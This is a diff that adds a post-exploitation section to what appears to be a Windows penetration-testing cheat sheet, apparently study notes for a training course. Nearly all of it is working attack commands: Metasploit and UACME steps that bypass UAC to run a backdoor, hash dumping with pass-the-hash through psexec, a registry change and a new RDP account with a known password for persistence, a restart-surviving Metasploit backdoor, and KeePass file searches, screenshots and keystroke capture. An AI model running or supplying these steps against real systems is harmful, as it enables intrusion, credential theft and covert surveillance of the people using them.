@@ -159,3 +159,37 @@ $ sudo rcracki_mt -h <first 8bits (16chars) of LM hash> -t 4 *.rti // uses a fol
 $ locate netntlm
 $ sudo perl netntlm.pl --file <netntlm hashes file> --seed <discovered plaintext from first 8 bytes> 
 ```
+#### 1.3 Post-Exploitation  
+_1.3.1 Privilege Escalation_
+```
+> run post/windows/gather/win_privs
+// if no admin privs, and UAC is enabled, can search uac for modules like:
+> use exploit/windows/local/bypassuac_injection // Set SESSION of target Meterpreter session
+
+Manually:
+download https://github.com/hfiref0x/UACME
+// Upload a Payload/backdoor to victim machine without privs, upload UAC exploit to machine. Run handler for backdoor,
+drop into shell, run exploit with the bypass UAC tool:
+C:\Users\els\Downloads>Akagi64.exe 10 C:\Users\els\Downloads\exploit.exe 
+// This runs the exploit backdoor with the UAC bypass tool using the option 10 (check usage)
+```
+_1.3.2 Persistence_  
+```
+> run post/windows/gather/smart_hashdump && > creds // dumps hashes, stores them locally, list hashes with creds command
+> use exploit/windows/smb/psexec // set SMBUser and SMBPass (collected hash) for persistence on target
+// If fails, give reg command to manage target machine registry to edit entry path:
+> reg setval -k ‘HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System’ -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1
+
+> run getgui -e -u atk -p atk // Enables RDP on system and creates the user atk with the pw atk
+$ xfreerdp /v:TargetIP:3389 /u:atk /p:atk // RDP into machine with created user
+
+msf> use exploit/windows/local/persistence // Set STARTUP type SYSTEM or USER, set SESSION, and set PAYLOAD (meterpreter), LHOST/LPORT. Use handler with same config as persistence module. Backdoor survives system restart.
+```
+_1.3.3 Pillaging_
+```
+> run post/windows/gather/ <-- lots of modules
+  enum_applications, /credentials/, credential_collector
+> search -f *.kdb -r -d . // search for all KeePass DB files in current directory of victim machine.
+
+> screenshot && keyscan_start && keyscan_dump //screenshot victim machine screen, start keystroke sniffer, dump keystrokes.
+```
